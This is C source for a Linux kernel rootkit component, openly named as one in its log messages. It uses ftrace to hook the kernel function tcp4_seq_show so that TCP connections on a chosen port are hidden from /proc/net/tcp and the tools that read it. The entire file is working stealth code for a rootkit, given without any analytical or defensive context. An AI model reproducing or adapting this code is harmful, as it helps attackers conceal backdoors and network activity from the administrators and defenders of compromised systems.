#include <linux/tcp.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#include "rk_define.h"
#include "rk_lookup.h"

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
  long ret;
  struct sock *sk = v;
  if (sk != (struct sock *)0x1 && htons(sk->sk_dport) == PORT) {
    return 0;
  }
  ret = orig_tcp4_seq_show(seq, v);
  return ret;
}

static void notrace rk_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs) {
  struct pt_regs *regs = ftrace_get_regs(fregs);
  if (!within_module(parent_ip, THIS_MODULE))
    regs->ip = (unsigned long)hook_tcp4_seq_show;
}

struct ftrace_ops rk_ftrace_ops;

int rk_hide_port_init(void) {
  int err;
  *((unsigned long *)&orig_tcp4_seq_show) = rk_lookup("tcp4_seq_show");
  rk_ftrace_ops.func = rk_ftrace_thunk;
  rk_ftrace_ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&rk_ftrace_ops, (unsigned long)orig_tcp4_seq_show,
                             0, 0);
  err = register_ftrace_function(&rk_ftrace_ops);
  if (err) {
    printk("rootkit: ftrace hook failed");
    return err;
  }
  return 0;
}

void rk_hide_port_exit(void) {
  int err;
  err = unregister_ftrace_function(&rk_ftrace_ops);
  err = ftrace_set_filter_ip(&rk_ftrace_ops, (unsigned long)orig_tcp4_seq_show,
                             1, 0);
  if (err) {
    printk("rootkit: ftrace unhook failed");
  }
}
